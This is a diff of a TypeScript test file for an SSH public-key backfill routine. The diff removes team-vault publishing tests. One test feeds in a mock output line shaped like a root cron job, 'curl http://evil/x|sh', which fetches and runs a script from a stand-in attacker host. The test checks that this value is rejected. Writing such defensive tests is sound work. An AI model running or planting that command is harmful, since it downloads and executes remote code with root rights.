@@ -6,7 +6,6 @@ const PUB_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHqW1p3nMuFvR5NHqhkxLQKfDVZ
 const secrets = new Map<string, string>();
 const getSecret = vi.fn(async (key: string) => secrets.get(key) ?? null);
 const storeSecret = vi.fn(async (_key: string, _value: string) => {});
-const saveTeamVaultSecretForVault = vi.fn(async (..._a: unknown[]) => {});
 const invoke = vi.fn(async (..._a: unknown[]) => `${PUB_KEY}\n`);
 
 vi.mock("@tauri-apps/api/core", () => ({ invoke: (...a: unknown[]) => invoke(...a) }));
@@ -14,11 +13,8 @@ vi.mock("@/services/vault", () => ({
   getSecret: (k: string) => getSecret(k),
   storeSecret: (k: string, v: string) => storeSecret(k, v),
 }));
-vi.mock("@/services/teamVaultSecrets", () => ({
-  saveTeamVaultSecretForVault: (...a: unknown[]) => saveTeamVaultSecretForVault(...a),
-}));
 
-const sshKey = { id: "k1", name: "laptop", vault_id: "team-1" } as any;
+const sshKey = { id: "k1", name: "laptop", vault_id: "personal" } as any;
 
 beforeEach(() => {
   vi.clearAllMocks();
@@ -43,11 +39,10 @@ describe("ensurePublicKey", () => {
     });
   });
 
-  it("backfills the derived half locally and into the key's team vault", async () => {
+  it("backfills the derived half locally", async () => {
     secrets.set("key:k1:private", "PRIVATE");
     await ensurePublicKey(sshKey);
     expect(storeSecret).toHaveBeenCalledWith("key:k1:public", PUB_KEY);
-    expect(saveTeamVaultSecretForVault).toHaveBeenCalledWith("team-1", "key:k1:public", PUB_KEY);
   });
 
   it("unlocks an encrypted private half with the stored passphrase", async () => {
@@ -79,11 +74,5 @@ describe("ensurePublicKey", () => {
     invoke.mockResolvedValueOnce("* * * * * root curl http://evil/x|sh" as never);
     await expect(ensurePublicKey(sshKey)).resolves.toBeNull();
     expect(storeSecret).not.toHaveBeenCalled();
-  });
-
-  it("still returns the derived half when publishing it to the team vault fails", async () => {
-    secrets.set("key:k1:private", "PRIVATE");
-    saveTeamVaultSecretForVault.mockRejectedValueOnce(new Error("offline") as never);
-    await expect(ensurePublicKey(sshKey)).resolves.toBe(PUB_KEY);
   });
 });
